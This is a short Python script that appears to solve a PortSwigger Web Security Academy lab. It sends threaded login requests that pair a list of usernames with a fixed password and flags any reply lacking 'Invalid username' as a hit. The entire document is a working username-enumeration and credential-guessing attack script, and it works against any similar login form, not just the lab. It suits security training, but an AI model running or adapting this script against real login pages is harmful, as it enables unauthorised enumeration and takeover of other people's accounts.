from multiprocessing import Pool
from concurrent.futures import ThreadPoolExecutor
import requests
import sys

URL = "https://ac671f431e730aa6c0488ea800be0017.web-security-academy.net/login"

users_file = open('users_portswigger.txt', 'r')
users_list = users_file.readlines()
users_file.close()
credentials = []

for user in users_list:
    credentials.append({'username': user.strip(), 'password': '123123'})

def fetch(session, url, body_req):
    with session.post(url, cookies=session.cookies, data=body_req) as response:
        if 'Invalid username' in response.text:
            print(f"fail: {body_req}")
        else:
            print(f"success: {body_req}")
            sys.exit()

with ThreadPoolExecutor(max_workers=10) as executor:
    with requests.Session() as session:
        executor.map(fetch, [session]*len(credentials), [URL]*len(credentials), credentials)
        executor.shutdown(wait=True, cancel_futures=True)
